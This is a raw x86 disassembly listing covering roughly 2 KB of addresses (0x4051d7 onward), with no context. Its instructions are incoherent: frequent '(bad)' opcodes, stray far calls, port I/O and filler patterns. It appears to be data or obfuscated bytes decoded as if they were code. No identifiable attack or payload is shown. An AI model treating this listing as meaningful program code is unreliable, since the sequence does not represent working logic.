  4051d7:	test   DWORD PTR [esi-0xff01],esi
  4051dd:	add    BYTE PTR [eax],al
  4051df:	call   FWORD PTR [eax]
  4051e1:	mov    dl,0xd7
  4051e3:	int3   
  4051e4:	adc    dh,ah
  4051e6:	lods   al,BYTE PTR ds:[esi]
  4051e7:	and    ecx,ebx
  4051e9:	inc    DWORD PTR [eax]
  4051eb:	cmp    edi,0xffffffff
  4051ee:	inc    DWORD PTR [eax]
  4051f0:	pop    ds
  4051f1:	call   0x155e:0xc085cc5a
  4051f8:	je     0x4051f9
  4051fa:	inc    DWORD PTR [ebx-0xff7601]
  405200:	out    0x84,al
  405202:	mov    al,ds:0x39ae6ff
  405207:	xchg   ebx,esi
  405209:	int3   
  40520a:	add    bh,bh
  40520c:	inc    DWORD PTR [ebx-0x715d007d]
  405212:	pusha  
  405213:	inc    DWORD PTR [esi-0x3b8e2be8]
  405219:	(bad)  
  40521a:	(bad)  
  40521b:	inc    DWORD PTR [eax]
  40521d:	dec    esp
  40521f:	add    dh,al
  405221:	mov    dh,0xdf
  405223:	mov    ebx,ecx
  405225:	imul   esp,DWORD PTR [esi-0x56],0x25
  405229:	inc    DWORD PTR [eax]
  40522b:	inc    DWORD PTR [eax]
  40522d:	int3   
  40522e:	(bad)  
  40522f:	dec    DWORD PTR [edx+edi*2]
  405232:	fiadd  WORD PTR [eax]
  405234:	jg     0x40520e
  405236:	pop    edi
  405237:	retf   
  405238:	scas   al,BYTE PTR es:[edi]
  405239:	inc    DWORD PTR [ebx-0xff0001]
  40523f:	add    BYTE PTR [ecx+0x39],dh
  405242:	bnd jmp DWORD PTR [edi+0x27]
  405246:	(bad)  
  405247:	repz xor edi,edi
  40524a:	add    bh,bh
  40524c:	dec    esp
  40524e:	add    DWORD PTR [eax],0xffffffff
  405251:	gs pop ecx
  405253:	jmp    DWORD PTR [esi+edi*4]
  405256:	pop    esi
  405257:	jns    0x4052b9
  405259:	(bad)  
  40525a:	inc    DWORD PTR [eax]
  40525c:	add    DWORD PTR [eax],0xffffffff
  40525f:	add    edi,0x15
  405262:	out    dx,al
  405263:	jmp    edx
  405265:	or     DWORD PTR [ebx+0x14],ecx
  405268:	and    BYTE PTR [eax],al
  40526a:	add    BYTE PTR [eax],al
  40526c:	add    bh,bh
  40526e:	add    bh,bh
  405270:	xchg   esp,eax
  405271:	push   es
  405272:	aas    
  405273:	int3   
  405274:	mov    al,0x84
  405276:	out    dx,eax
  405277:	ins    BYTE PTR es:[edi],dx
  405278:	aas    
  405279:	add    bh,bh
  40527b:	inc    DWORD PTR [eax]
  40527d:	inc    DWORD PTR [eax]
  40527f:	call   FWORD PTR [ebp-0x3cff2456]
  405285:	stos   BYTE PTR es:[edi],al
  405286:	pop    eax
  405287:	sbb    al,0x4
  405289:	mov    edi,edi
  40528b:	dec    esp
  40528d:	(bad)  
  40528e:	(bad)  
  40528f:	dec    DWORD PTR [esi]
  405291:	push   edi
  405292:	(bad)  
  405294:	ret    0x9abb
  405297:	iret   
  405298:	ret    
  405299:	(bad)  
  40529a:	dec    esp
  40529c:	inc    DWORD PTR [eax]
  40529e:	mov    edi,edi
  4052a0:	mov    BYTE PTR [edx],0xc6
  4052a3:	cmp    DWORD PTR [ebp+0x1f],0xffffffcc
  4052a7:	sbb    eax,0x8389e9
  4052ac:	(bad)  
  4052ad:	(bad)  
  4052ae:	dec    esp
  4052b0:	loopne 0x405260
  4052b2:	rol    BYTE PTR [eax],0x8b
  4052b5:	sbb    al,0x3b
  4052b7:	add    ax,0x83
  4052bb:	(bad)  
  4052bc:	inc    DWORD PTR [eax]
  4052be:	(bad)  
  4052bf:	push   DWORD PTR [esi-0x62]
  4052c2:	jmp    DWORD PTR [ebx-0x3d114b36]
  4052c9:	add    BYTE PTR [eax],al
  4052cb:	inc    DWORD PTR [eax]
  4052cd:	int3   
  4052ce:	add    bh,bh
  4052d0:	lds    ecx,FWORD PTR [eax+ebx*4]
  4052d3:	add    BYTE PTR [ecx+0x1ae781f],ah
  4052d9:	dec    esp
  4052db:	inc    DWORD PTR [eax]
  4052dd:	inc    DWORD PTR [ebx-0x69d28b34]
  4052e3:	jmp    esp
  4052e5:	xchg   ebx,eax
  4052e6:	add    ch,ch
  4052e8:	inc    ecx
  4052e9:	mov    DWORD PTR [eax],eax
  4052eb:	inc    DWORD PTR [eax]
  4052ed:	add    bh,bh
  4052ef:	add    BYTE PTR [ebx+eiz*4],dh
  4052f2:	mov    ?,edi
  4052f4:	push   ss
  4052f5:	fldcw  WORD PTR [esi-0x7600dca1]
  4052fb:	add    bh,bh
  4052fd:	(bad)  
  4052fe:	(bad)  
  4052ff:	call   DWORD PTR [ebp+0x27003e34]
  405305:	xor    DWORD PTR [ecx-0xfff89c],ebp
  40530b:	int3   
  40530c:	dec    esp
  40530e:	add    BYTE PTR [eax],al
  405310:	(bad)  
  405311:	jmp    0x892352ee
  405316:	imul   ebp,ecx,0x8300ffa4
  40531c:	inc    DWORD PTR [ebx+0x3f2dffff]
  405322:	call   FWORD PTR es:[edx+0x364efbe1]
  405329:	dec    esp
  40532b:	add    BYTE PTR [ebx+0x1200ccff],al
  405331:	icebp  
  405332:	je     0x405334
  405334:	push   0xec850666
  405339:	add    BYTE PTR [eax],al
  40533b:	add    bh,bh
  40533d:	inc    DWORD PTR [eax]
  40533f:	inc    DWORD PTR [ebp+0x5b006b9f]
  405345:	mov    eax,ds:0x89b41dd5
  40534a:	dec    esp
  40534c:	dec    esp
  40534e:	int3   
  40534f:	int3   
  405350:	jle    0x405312
  405352:	out    0xff,eax
  405354:	or     DWORD PTR [ecx-0x5c],ebp
  405357:	dec    BYTE PTR [edx-0x1]
  40535a:	inc    DWORD PTR [eax]
  40535c:	int3   
  40535d:	inc    DWORD PTR [ebx+0x19b860ff]
  405363:	add    BYTE PTR [esi-0x917d79a],dl
  405369:	add    BYTE PTR [ebx-0x34],al
  40536f:	call   FWORD PTR [ebx-0x7b0025c1]
  405375:	outs   dx,BYTE PTR ds:[esi]
  405376:	cmp    eax,0xffffe3a6
  40537b:	add    bh,bh
  40537d:	inc    DWORD PTR [ebx-0x428d0a01]
  405383:	add    BYTE PTR [ebx+eax*4-0xa17568],ch
  40538a:	add    bh,bh
  40538c:	cmp    edi,0xffffff89
  40538f:	mov    DWORD PTR [esi-0x1800cc55],eax
  405395:	(bad)  
  405396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405397:	out    0x7c,al
  405399:	(bad)  
  40539a:	inc    DWORD PTR [eax]
  40539c:	or     esp,0xffffffff
  40539f:	dec    DWORD PTR [ebx-0x70]
  4053a2:	lea    eax,[ebx+0x26e9952e]
  4053a8:	stos   DWORD PTR es:[edi],eax
  4053a9:	inc    DWORD PTR [eax]
  4053ab:	add    bh,bh
  4053ad:	cmp    edi,0x0
  4053b0:	add    edx,edi
  4053b2:	sbb    eax,0x255544ff
  4053b7:	dec    esp
  4053b8:	pop    esi
  4053b9:	int3   
  4053ba:	inc    DWORD PTR [ebx-0x7c000001]
  4053c0:	or     BYTE PTR [ebp+0x7f5dffb5],bh
  4053c6:	cmc    
  4053c7:	sti    
  4053c8:	jg     0x4053ca
  4053ca:	(bad)  
  4053cb:	inc    DWORD PTR [eax]
  4053cd:	add    BYTE PTR [eax],al
  4053cf:	push   DWORD PTR [esi-0x5a]
  4053d2:	push   ecx
  4053d3:	push   DWORD PTR [ecx]
  4053d5:	test   al,0xd9
  4053d7:	pop    ebx
  4053d8:	ja     0x4053da
  4053da:	cmp    edi,0x0
  4053dd:	inc    DWORD PTR [eax]
  4053df:	add    BYTE PTR [ecx],bl
  4053e1:	loop   0x405431
  4053e3:	inc    ebp
  4053e5:	cmp    dl,BYTE PTR [esi-0x7c00c89a]
  4053eb:	add    ah,cl
  4053ed:	add    DWORD PTR [eax],0xffffffff
  4053f0:	pop    ecx
  4053f1:	scas   eax,DWORD PTR es:[edi]
  4053f2:	fiadd  DWORD PTR [ebx+0x397dd56c]
  4053f8:	pop    edi
  4053f9:	mov    edi,edi
  4053fb:	(bad)  
  4053fc:	(bad)  
  4053fd:	dec    DWORD PTR [ecx-0x521adc00]
  405403:	add    bh,cl
  405405:	pop    eax
  405406:	mov    esp,0xff6745
  40540b:	add    DWORD PTR [eax],0x0
  40540e:	inc    DWORD PTR [ebx+0xe0f1d1]
  405414:	aam    0xef
  405416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405417:	mov    al,ds:0xff00ffae
  40541c:	dec    DWORD PTR [ecx+0x401fffff]
  405422:	jb     0x405423
  405424:	repnz int 0x28
  405427:	dec    ebp
  405428:	and    edi,edi
  40542a:	cmp    edi,0xffffffff
  40542d:	add    BYTE PTR [ebx-0x55f06234],al
  405433:	mov    esi,ebx
  405435:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405436:	pop    ebp
  405437:	(bad)  
  405438:	sub    al,0xff
  40543a:	inc    DWORD PTR [eax]
  40543c:	inc    DWORD PTR [eax]
  40543e:	add    BYTE PTR [ebx+0xdbd4e5],al
  405444:	(bad)  
  405445:	cli    
  405446:	les    esi,FWORD PTR [esi]
  405448:	mov    eax,0x8383ff
  40544d:	mov    DWORD PTR [ebx+0x4c048e89],eax
  405453:	adc    edi,0x37
  405456:	sbb    edx,DWORD PTR [ecx-0x1f]
  405459:	add    DWORD PTR [ebx-0x337cff01],0xffffffff
  405460:	data16 xor dh,bh
  405463:	call   FWORD PTR [edi]
  405465:	and    ecx,DWORD PTR [edx]
  405467:	int3   
  405468:	pop    edi
  405469:	add    BYTE PTR [eax],al
  40546b:	add    bh,bh
  40546d:	add    bh,bh
  40546f:	adc    DWORD PTR [esi-0x4b],0x47
  405473:	(bad)  
  405474:	aas    
  405475:	dec    ebp
  405476:	mov    dh,0x73
  405478:	jno    0x405403
  40547a:	(bad)  
  40547b:	(bad)  
  40547c:	inc    DWORD PTR [eax]
  40547e:	inc    DWORD PTR [ebx-0xcb48ac]
  405484:	jmp    0x40541d
  405486:	sbb    bl,BYTE PTR [ebp-0x26]
  405489:	inc    DWORD PTR [ebx-0xff77]
  40548f:	xor    DWORD PTR ds:0xcf0091ce,0xffffffae
  405496:	bound  edx,QWORD PTR [ecx-0x22]
  405499:	add    ah,cl
  40549b:	dec    esp
  40549d:	add    BYTE PTR [eax],al
  40549f:	(bad)  
  4054a0:	cmp    eax,0x328389ec
  4054a5:	sbb    al,0xf2
  4054a7:	sub    BYTE PTR [edi],0xcc
  4054aa:	cmp    edi,0xffffff83
  4054ad:	cmp    edi,0xffffff83
  4054b0:	sub    esi,esp
  4054b2:	dec    eax
  4054b3:	int3   
  4054b4:	(bad)  
  4054b5:	sbb    DWORD PTR [ecx+0x48],eax
  4054b8:	add    al,0x0
  4054ba:	(bad)  
  4054bb:	inc    DWORD PTR [eax]
  4054bd:	mov    DWORD PTR [eax],eax
  4054bf:	add    BYTE PTR [edx],bl
  4054c1:	pop    esp
  4054c2:	pop    ebp
  4054c3:	add    BYTE PTR [edi+0x6a],ch
  4054c6:	sub    DWORD PTR ds:0xffccff5a,ebx
  4054cc:	inc    DWORD PTR [ebx-0x129d0077]
  4054d2:	push   ebp
  4054d3:	cmp    ebx,0xffffffb9
  4054d6:	dec    edx
  4054d7:	es xor edi,edi
  4054da:	inc    DWORD PTR [eax]
  4054dc:	dec    DWORD PTR [ecx+0x56638983]
  4054e2:	add    bh,bh
  4054e4:	push   ss
  4054e5:	ja     0x40549e
  4054e7:	cwde   
  4054e8:	pop    edx
  4054e9:	(bad)  
  4054ea:	(bad)  
  4054eb:	dec    DWORD PTR [ecx-0x1733ff7d]
  4054f1:	adc    BYTE PTR [ecx-0x7d],cl
  4054f4:	call   0xcf6bb23d
  4054f9:	add    BYTE PTR [ebx+0xff0000],al
  4054ff:	add    dh,dh
  405501:	adc    al,0x60
  405503:	add    BYTE PTR [ebx-0x73b70274],al
  405509:	add    DWORD PTR [eax],0xffffffff
  40550c:	inc    DWORD PTR [ebx+0x554accff]
  405512:	cld    
  405513:	add    BYTE PTR ds:0xfd9792db,dh
  405519:	inc    DWORD PTR [eax]
  40551b:	add    bh,bh
  40551d:	(bad)  
  40551e:	inc    DWORD PTR [ebx-0x7c5c894d]
  405524:	test   eax,0xb06a1553
  405529:	(bad)  
  40552a:	inc    DWORD PTR [eax]
  40552c:	(bad)  
  40552d:	(bad)  
  40552e:	inc    DWORD PTR [eax]
  405530:	push   0x79
  405532:	pusha  
  405533:	(bad)  
  405534:	mov    esi,0xc69d72a1
  405539:	inc    DWORD PTR [ebx+0xff83ff]
  40553f:	(bad)  
  405540:	mov    edx,0x4400d216
  405545:	and    BYTE PTR [eax+0x59],0xc3
  405549:	add    BYTE PTR [ecx-0x7c00ff01],cl
  40554f:	and    DWORD PTR [edi+edx*8+0xc],0xffffffff
  405554:	mov    ch,0x32
  405556:	lea    esi,[edi-0x33000099]
  40555c:	inc    DWORD PTR [eax]
  40555e:	add    BYTE PTR [eax],al
  405560:	pop    ecx
  405561:	and    DWORD PTR [ebx-0x1],ecx
  405564:	loope  0x40554d
  405566:	mov    eax,ds:0x83ff3f95
  40556b:	(bad)  
  40556c:	(bad)  
  40556d:	inc    DWORD PTR [eax]
  40556f:	int3   
  405570:	dec    eax
  405571:	es pushf 
  405573:	call   DWORD PTR [edi+eiz*1-0x53ae44]
  40557a:	(bad)  
  40557b:	(bad)  
  40557c:	inc    DWORD PTR [eax]
  40557e:	int3   
  40557f:	add    DWORD PTR [edx+ecx*1],0x2a
  405583:	add    BYTE PTR [esi],ch
  405585:	sub    BYTE PTR [eax],ah
  405587:	fisub  DWORD PTR [ecx-0x77]
  40558a:	cmp    edi,0x0
  40558d:	add    DWORD PTR [eax],0xffffffff
  405590:	(bad)  
  405591:	mov    bh,0x54
  405593:	jmp    DWORD PTR [ebx+0x6d4b3668]
  405599:	(bad)  
  40559a:	(bad)  
  40559b:	(bad)  
  40559c:	(bad)  
  40559d:	inc    DWORD PTR [eax]
  40559f:	push   DWORD PTR [edx]
  4055a1:	jle    0x40556b
  4055a3:	add    BYTE PTR [esi-0x43],cl
  4055a6:	jb     0x40555a
  4055a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a9:	add    bh,bh
  4055ab:	(bad)  
  4055ac:	(bad)  
  4055ad:	inc    DWORD PTR [ebx+0x5fc28d83]
  4055b3:	push   DWORD PTR [ebp+0x2c]
  4055b6:	and    ebx,esi
  4055b8:	je     0x4055b9
  4055ba:	(bad)  
  4055bb:	(bad)  
  4055bc:	inc    DWORD PTR [eax]
  4055be:	inc    DWORD PTR [eax]
  4055c0:	nop
  4055c1:	aas    
  4055c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055c3:	add    BYTE PTR [edx-0x14],bl
  4055c6:	aaa    
  4055c7:	cmp    ah,BYTE PTR [ebx]
  4055c9:	(bad)  
  4055ca:	(bad)  
  4055cb:	(bad)  
  4055cc:	inc    DWORD PTR [eax]
  4055ce:	int3   
  4055cf:	int3   
  4055d0:	add    eax,0x1ccf5ef
  4055d5:	lahf   
  4055d6:	mov    dh,0xb6
  4055d8:	test   al,0x83
  4055da:	cmp    edi,0xffffff83
  4055dd:	inc    DWORD PTR [eax]
  4055df:	inc    ebp
  4055e1:	lods   al,BYTE PTR ds:[esi]
  4055e2:	mov    al,BYTE PTR [ebx-0x79bdd9ab]
  4055e8:	sub    edi,edi
  4055ea:	add    BYTE PTR [ebx+0xff00ff],al
  4055f0:	int    0xda
  4055f2:	in     al,0x0
  4055f4:	test   BYTE PTR [ebp-0xbb7c8a],ah
  4055fa:	add    BYTE PTR [ebx-0x7c000100],al
  405600:	xabort 0x36
  405603:	add    BYTE PTR [edi],dh
  405605:	and    BYTE PTR [esi-0x4f],0xd9
  405609:	add    BYTE PTR [ebx-0x1],al
  40560f:	jmp    ebx
  405611:	sub    BYTE PTR [ebp-0x1],bl
  405614:	sbb    al,0xab
  405616:	stc    
  405617:	mov    ss,WORD PTR ds:0xff8300ff
  40561d:	add    BYTE PTR [eax],al
  40561f:	sbb    DWORD PTR [ebx+0x7e00f77e],0x6d
  405626:	neg    DWORD PTR ds:0xffccff41
  40562c:	int3   
  40562d:	inc    DWORD PTR [ebx-0xde60934]
  405633:	or     DWORD PTR [ebp-0xa],0xffffffc6
  405637:	dec    ebp
  405638:	out    0x0,al
  40563a:	add    DWORD PTR [ebx+0x83ff],0xffffffdf
  405641:	pop    es
  405642:	dec    ecx
  405643:	add    BYTE PTR [ecx-0x21c53dd2],dh
  405649:	mov    edi,edi
  40564b:	cmp    edi,0xffffff89
  40564e:	int3   
  40564f:	or     DWORD PTR [esi+0x1a00bb1f],0x40
  405656:	fbld   TBYTE PTR [edx-0xff1f]
  40565c:	inc    DWORD PTR [ebx-0x20557c77]
  405662:	retf   
  405663:	push   edi
  405665:	sub    eax,edx
  405667:	cmp    DWORD PTR [edi+edi*8+0xcccc89],ebx
  40566e:	add    DWORD PTR [eax],0x7a
  405671:	stc    
  405672:	or     eax,0xb79f0eff
  405677:	clc    
  405678:	jecxz  0x40567a
  40567a:	(bad)  
  40567b:	inc    DWORD PTR [ebx+0x24ffffcc]
  405681:	mov    bh,0x89
  405683:	add    BYTE PTR [ecx+0x2b],al
  405686:	pop    ecx
  405687:	popa   
  405688:	(bad)  
  405689:	(bad)  
  40568a:	(bad)  
  40568b:	inc    DWORD PTR [eax]
  40568d:	add    BYTE PTR [ebx-0x5ee96a7d],al
  405693:	adc    esi,0x18
  405696:	dec    edx
  405697:	sub    al,0xca
  405699:	(bad)  
  40569a:	(bad)  
  40569b:	(bad)  
  40569c:	(bad)  
  40569d:	(bad)  
  40569e:	dec    DWORD PTR [ecx-0x7c9236bb]
  4056a4:	mov    edi,0xfd36ce69
  4056a9:	dec    DWORD PTR [ecx-0x7c000100]
  4056af:	call   esi
  4056b1:	(bad)  
  4056b2:	(bad)  
  4056b3:	call   FWORD PTR [eax-0x763581cf]
  4056b9:	inc    DWORD PTR [eax]
  4056bb:	(bad)  
  4056bc:	(bad)  
  4056bd:	dec    esp
  4056bf:	int3   
  4056c0:	pop    ds
  4056c1:	xlat   BYTE PTR ds:[ebx]
  4056c2:	xchg   edx,eax
  4056c3:	mov    DWORD PTR [edx+eiz*1-0xf1c33],ecx
  4056ca:	inc    DWORD PTR [eax]
  4056cc:	mov    DWORD PTR [eax],eax
  4056ce:	(bad)  
  4056cf:	call   ecx
  4056d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d2:	mov    edi,?
  4056d4:	push   edx
  4056d5:	jb     0x405747
  4056d7:	test   esp,eax
  4056d9:	int3   
  4056da:	add    BYTE PTR [eax],al
  4056dc:	dec    esp
  4056de:	add    BYTE PTR [ecx-0x377da0],cl
  4056e4:	add    DWORD PTR [edx],ebp
  4056e6:	std    
  4056e7:	imul   ecx,DWORD PTR [eax-0x34],0xffccffcc
  4056ee:	add    BYTE PTR [ecx+0xc78091],cl
  4056f4:	repz shl DWORD PTR [esi],1
  4056f7:	daa    
  4056f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056f9:	add    bh,bh
  4056fb:	(bad)  
  4056fc:	(bad)  
  4056fd:	(bad)  
  4056fe:	(bad)  
  4056ff:	dec    DWORD PTR [ebx-0x73]
  405702:	dec    edi
  405703:	add    BYTE PTR [ebx],dl
  405705:	cwde   
  405706:	cs adc al,0x7e
  405709:	cmp    edi,0x0
  40570c:	inc    DWORD PTR [ebx-0x75400034]
  405712:	xor    bh,bh
  405714:	jae    0x405725
  405716:	int    0xa2
  405718:	push   ds
  405719:	int3   
  40571a:	(bad)  
  40571b:	(bad)  
  40571c:	inc    DWORD PTR [ebx+0xcf383ff]
  405722:	dec    ecx
  405723:	adc    DWORD PTR [eax+esi*8-0x39],0x31
  405728:	dec    ecx
  405729:	mov    edi,edi
  40572b:	add    bh,bh
  40572d:	add    bh,bh
  40572f:	add    dh,bl
  405731:	das    
  405732:	pop    ds
  405733:	call   DWORD PTR [esp+edx*8+0x94db2]
  40573a:	inc    DWORD PTR [ebx+0xffffff]
  405740:	es ins DWORD PTR es:[edi],dx
  405742:	retf   
  405743:	(bad)  
  405744:	cmp    BYTE PTR [ebp-0x4d],dl
  405747:	mov    es,WORD PTR [esi]
  405749:	or     esp,0x0
  40574c:	int3   
  40574d:	int3   
  40574e:	cmp    edi,0xe
  405751:	and    DWORD PTR [ebp-0x1],ebx
  405754:	bound  esp,QWORD PTR [edi-0x21]
  405757:	or     BYTE PTR ds:0xff89cc00,al
  40575d:	add    bh,bh
  40575f:	add    BYTE PTR [esp+esi*2+0x29],dl
  405763:	add    BYTE PTR [edi+0x2f],dh
  405766:	adc    WORD PTR [edx+0xff8300],si
  40576d:	add    bh,bh
  40576f:	xor    DWORD PTR [esi-0x160085b9],0xffffffa8
  405776:	add    bh,al
  405778:	jae    0x405779
  40577a:	mov    edi,edi
  40577c:	cmp    edi,0xffffffff
  40577f:	push   DWORD PTR [esi+0x4e8370a3]
  405785:	mov    al,0xeb
  405787:	xchg   al,bh
  405789:	inc    DWORD PTR [eax]
  40578b:	inc    DWORD PTR [eax]
  40578d:	inc    DWORD PTR [eax]
  40578f:	adc    DWORD PTR [ebx-0x6fff25a2],0x6e
  405796:	inc    esi
  405797:	inc    ebx
  405798:	fdivr  st,st(7)
  40579a:	inc    DWORD PTR [eax]
  40579c:	(bad)  
  40579d:	(bad)  
  40579e:	inc    DWORD PTR [eax]
  4057a0:	and    ebx,edx
  4057a2:	mov    bh,0xff
  4057a4:	stos   BYTE PTR es:[edi],al
  4057a5:	xchg   edx,eax
  4057a6:	xchg   edx,eax
  4057a7:	lods   eax,DWORD PTR ds:[esi]
  4057a8:	add    al,0xff
  4057aa:	add    bh,bh
  4057ac:	inc    DWORD PTR [eax]
  4057ae:	(bad)  
  4057af:	call   esp
  4057b1:	sbb    BYTE PTR ds:0x14adba00,cl
  4057b7:	inc    esi
  4057b8:	xchg   esi,eax
  4057b9:	inc    DWORD PTR [ebx-0x7601]
  4057bf:	add    BYTE PTR [esi+edi*2],ch
  4057c2:	xchg   edx,eax
  4057c3:	add    BYTE PTR [ebx],cl
  4057c5:	pop    ecx
  4057c6:	xor    ecx,ebx
  4057c8:	lods   eax,DWORD PTR ds:[esi]
  4057c9:	dec    DWORD PTR [ecx-0x10000]
  4057cf:	sbb    edi,0xffffffd4
  4057d2:	sbb    DWORD PTR [ebx+0x604853f5],eax
  4057d8:	sar    edi,0x89
  4057db:	(bad)  
  4057dc:	inc    DWORD PTR [ebx-0x650a0001]
  4057e2:	jg     0x405767
  4057e4:	(bad)  
  4057e5:	sbb    ebp,ecx
  4057e7:	fst    QWORD PTR [ecx-0x34]
  4057ea:	inc    DWORD PTR [eax]
  4057ec:	inc    DWORD PTR [eax]
  4057ee:	int3   
  4057ef:	int3   
  4057f0:	inc    ecx
  4057f1:	cmp    ebp,DWORD PTR [eax-0x1]
  4057f4:	aad    0xea
  4057f6:	in     al,dx
  4057f7:	jns    0x405876
  4057f9:	add    BYTE PTR [eax],al
  4057fb:	dec    esp
  4057fd:	add    ah,cl
  4057ff:	add    BYTE PTR [ebp+0x5ff13a1],dh
  405805:	sbb    DWORD PTR [eax-0x76ff3127],eax
  40580b:	cmp    edi,0xffffffff
  40580e:	add    BYTE PTR [eax],al
  405810:	out    0xc2,eax
  405812:	pop    edx
  405813:	add    BYTE PTR [esi+edx*8+0x1114d],dl
  40581a:	add    BYTE PTR [ecx-0x330001],cl
  405820:	or     eax,0x16007bdc
  405825:	cmp    al,0x46
  405827:	mov    dl,0xd
  405829:	add    bh,bh
  40582b:	(bad)  
  40582c:	dec    esp
  40582e:	add    BYTE PTR [eax],al
  405830:	ret    0x91a8
  405833:	add    BYTE PTR [edx+0x7b],dh
  405836:	dec    ebx
  405837:	(bad)  
  405838:	pop    ds
  405839:	inc    DWORD PTR [eax]
  40583b:	add    bh,bh
  40583d:	(bad)  
  40583e:	dec    esp
  405840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405841:	adc    ah,ah
  405843:	add    BYTE PTR [ecx+0x58e81e5e],ch
  405849:	(bad)  
  40584a:	(bad)  
  40584b:	(bad)  
  40584c:	dec    DWORD PTR [ecx+0x550300ff]
  405852:	and    eax,0x75c595ff
  405857:	sbb    esi,esi
  405859:	(bad)  
  40585a:	inc    DWORD PTR [eax]
  40585c:	add    bh,bh
  40585e:	inc    DWORD PTR [ebx+0x8162e4]
  405864:	mov    BYTE PTR [edx],dl
  405866:	xlat   BYTE PTR ds:[ebx]
  405867:	xchg   ebp,eax
  405868:	lods   eax,DWORD PTR ds:[esi]
  405869:	add    DWORD PTR [eax],0xffffffff
  40586c:	add    BYTE PTR [eax],al
  40586e:	(bad)  
  40586f:	jmp    DWORD PTR [esi-0x1b]
  405872:	mov    al,BYTE PTR [eax]
  405874:	pop    ebp
  405875:	jne    0x405867
  405877:	leave  
  405878:	xchg   edi,eax
  405879:	(bad)  
  40587a:	inc    DWORD PTR [eax]
  40587c:	(bad)  
  40587d:	inc    DWORD PTR [eax]
  40587f:	add    BYTE PTR [edi],ch
  405881:	pop    ebp
  405882:	loopne 0x405884
  405884:	or     al,ah
  405886:	push   eax
  405887:	cs push 0xffff00ff
  40588d:	add    BYTE PTR [eax],al
  40588f:	(bad)  
  405890:	sti    
  405891:	mov    eax,ds:0x160aff01
  405896:	jge    0x4058e1
  405898:	lods   al,BYTE PTR ds:[esi]
  405899:	add    bh,bh
  40589b:	inc    DWORD PTR [eax]
  40589d:	mov    DWORD PTR [ebx-0x54200d00],eax
  4058a3:	add    BYTE PTR [edi],dl
  4058a5:	sahf   
  4058a6:	lods   al,BYTE PTR ds:[esi]
  4058a7:	mov    ds:0xcc008967,eax
  4058ac:	int3   
  4058ad:	(bad)  
  4058ae:	(bad)  
  4058af:	call   FWORD PTR [ecx+edi*4+0x57]
  4058b3:	jmp    FWORD PTR [ebx+ebp*2]
  4058b6:	pop    ebx
  4058b7:	daa    
  4058b8:	push   cs
  4058b9:	add    BYTE PTR [eax],al
  4058bb:	add    bh,bh
  4058bd:	inc    DWORD PTR [eax]
  4058bf:	jmp    DWORD PTR [ecx]
  4058c1:	aad    0x8e
  4058c3:	jmp    FWORD PTR [ebx-0x5d8ecdb4]
  4058c9:	inc    DWORD PTR [eax]
  4058cb:	(bad)  
  4058cc:	(bad)  
  4058cd:	(bad)  
  4058ce:	dec    DWORD PTR [ecx-0x76896849]
  4058d4:	pop    ecx
  4058d5:	or     edi,esi
  4058d7:	cmp    ah,bl
  4058d9:	add    bh,bh
  4058db:	int3   
  4058dc:	mov    DWORD PTR [ebx-0x7d190000],eax
  4058e2:	dec    ebx
  4058e3:	add    BYTE PTR [ebx+0x99bfea9],bl
  4058e9:	add    BYTE PTR [ebx+0xff00cc],al
  4058ef:	push   DWORD PTR [esi+0x70]
  4058f2:	cmp    bh,bh
  4058f4:	mov    ah,0xf7
  4058f6:	fisttp WORD PTR [eax]
  4058f8:	in     al,dx
  4058f9:	mov    esp,ecx
  4058fb:	inc    DWORD PTR [eax]
  4058fd:	add    bh,bh
  4058ff:	add    BYTE PTR [ecx],dh
  405901:	xor    DWORD PTR [ebp+0x2288c7ff],edx
  405907:	dec    ecx
  405908:	sbb    edi,edi
  40590a:	inc    DWORD PTR [eax]
  40590c:	add    BYTE PTR [eax],al
  40590e:	mov    DWORD PTR [eax],eax
  405910:	dec    edx
  405911:	jg     0x405973
  405913:	mov    DWORD PTR [edi],esp
  405915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405916:	leave  
  405917:	inc    ebx
  405918:	repz cmp edi,0xffffffff
  40591c:	inc    DWORD PTR [ebx+0x29560000]
  405922:	ins    BYTE PTR es:[edi],dx
  405923:	cmp    DWORD PTR [ecx-0x7e235c7b],0xffffffcc
  40592a:	int3   
  40592b:	(bad)  
  40592c:	(bad)  
  40592d:	(bad)  
  40592e:	(bad)  
  40592f:	call   FWORD PTR [ebx+0x3c]
  405932:	xor    al,0x0
  405934:	sbb    eax,0xdfcb6418
  405939:	add    BYTE PTR [eax],al
  40593b:	add    bh,bh
  40593d:	inc    DWORD PTR [eax]
  40593f:	add    BYTE PTR [ebx-0x34],al
  405942:	fcos   
  405944:	add    al,BYTE PTR [ecx+0xa]
  405947:	sub    eax,0xff00ffcb
  40594c:	add    bh,bh
  40594e:	inc    DWORD PTR [ebx+0x32e833]
  405954:	repz sbb esi,DWORD PTR [edi]
  405957:	lock fiadd DWORD PTR [eax]
  40595a:	mov    DWORD PTR [ebx-0x76007d],eax
  405960:	ds xchg edi,eax
  405962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405963:	sbb    DWORD PTR [eax],0x46
  405966:	daa    
  405967:	push   esp
  405968:	adc    ah,cl
  40596a:	inc    DWORD PTR [eax]
  40596c:	mov    edi,edi
  40596e:	add    ah,cl
  405970:	(bad)  
  405971:	call   0x37fb:0xd08cff14
  405978:	idiv   bh
  40597a:	inc    DWORD PTR [ebx+0xcc0089]
  405980:	shl    BYTE PTR [edi],1
  405982:	cdq    
  405983:	add    BYTE PTR [ecx],bh
  405985:	or     BYTE PTR [ebx-0xff66b7],ch
  40598b:	(bad)  
  40598c:	(bad)  
  40598d:	(bad)  
  40598e:	(bad)  
  40598f:	call   DWORD PTR [ebp-0x6dff5d1e]
  405995:	ins    DWORD PTR es:[edi],dx
  405996:	push   0xfffffff6
  405998:	mov    bh,bh
  40599a:	(bad)  
  40599b:	(bad)  
  40599c:	inc    DWORD PTR [eax]
  40599e:	add    DWORD PTR [ebx-0x2fad05],0x26
  4059a5:	dec    esp
  4059a6:	or     edx,eax
  4059a8:	cmp    al,0xff
